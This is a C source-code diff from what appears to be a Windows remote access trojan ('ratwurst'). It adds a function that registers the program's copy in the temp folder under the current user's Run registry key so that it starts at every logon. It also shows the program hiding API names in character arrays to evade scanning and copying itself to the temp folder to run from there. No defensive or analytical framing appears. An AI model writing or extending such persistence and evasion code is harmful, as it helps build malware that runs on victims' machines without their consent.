@@ -357,6 +357,38 @@ CopyAndRunFromTempFolder(char* currentPath, char* newPath)
 	RunCommandInProcess(commandToRun, 0);
 }
 
+int SetupRegistryKey(const char* execPath)
+{
+	HKEY keyHandle;
+	LSTATUS regOpenStatus = RegOpenKeyExA(HKEY_CURRENT_USER,
+										  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+										  0, KEY_WRITE, &keyHandle);
+	if ( regOpenStatus != ERROR_SUCCESS )
+	{
+#if DEBUG
+		OutputDebugStringA("Error opening the registry key.");
+#endif
+		return 1;
+	}
+
+	LSTATUS regSetStatus = RegSetValueExA(keyHandle,
+										  "ratwurst",
+										  0,
+										  REG_SZ,
+										  (const BYTE *)execPath,
+										  (DWORD)strlen(execPath));
+	if ( regSetStatus != ERROR_SUCCESS )
+	{
+#if DEBUG
+		OutputDebugStringA("Error setting the registry key.");
+#endif
+		return 1;
+	}
+
+	RegCloseKey(keyHandle);
+	return 0;
+}
+
 int CALLBACK
 WinMain(HINSTANCE hInstance,
 		HINSTANCE hPrevInstance,
@@ -365,7 +397,21 @@ WinMain(HINSTANCE hInstance,
 {
 	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
 	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
+	
+	char tempPath[MAX_PATH] = {};
 
+	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
+	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
+	f_GetTempPathA(MAX_PATH, tempPath);
+
+	char execPath[MAX_PATH + 9] = {};
+	strncpy_s(execPath, MAX_PATH, tempPath, strlen(tempPath));
+	strncat_s(execPath, "rtwst.tmp", 9);
+	
+	SetupRegistryKey(execPath);
+	
+	return 0;
+	
 	char currentPath[MAX_PATH];
 	if ( GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0 )
 	{
@@ -374,23 +420,13 @@ WinMain(HINSTANCE hInstance,
 #endif		
 	}
 
-	char tempPath[MAX_PATH];
-
-	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
-	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
-	f_GetTempPathA(MAX_PATH, tempPath);
-
-	char newPath[MAX_PATH + 9];
-	strncpy_s(newPath, MAX_PATH, tempPath, strlen(tempPath));
-	strncat_s(newPath, "rtwst.tmp", 9);
-
 #if DEBUG	
 	if ( 0 )
 #else
-	if ( strcmp(currentPath, newPath) != 0 )
+	if ( strcmp(currentPath, execPath) != 0 )
 #endif
 	{
-		CopyAndRunFromTempFolder(currentPath, newPath);
+		CopyAndRunFromTempFolder(currentPath, execPath);
 		return 0;
 	}
 	
